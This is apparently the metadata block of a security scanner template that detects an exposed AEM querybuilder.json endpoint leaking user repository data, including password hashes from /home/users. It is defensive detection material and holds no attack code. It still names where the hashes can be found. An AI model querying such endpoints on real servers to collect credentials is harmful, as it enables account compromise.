  name: AEM QueryBuilder JSON Exposure
  author: tess,assetnote
  severity: critical
  description: |
    Detected an exposed AEM QueryBuilder endpoint that returned user repository information, including password hashes (rep:password) from /home/users.This behavior indicated that the instance had leaked sensitive data through unauthenticated access to the querybuilder.json API.
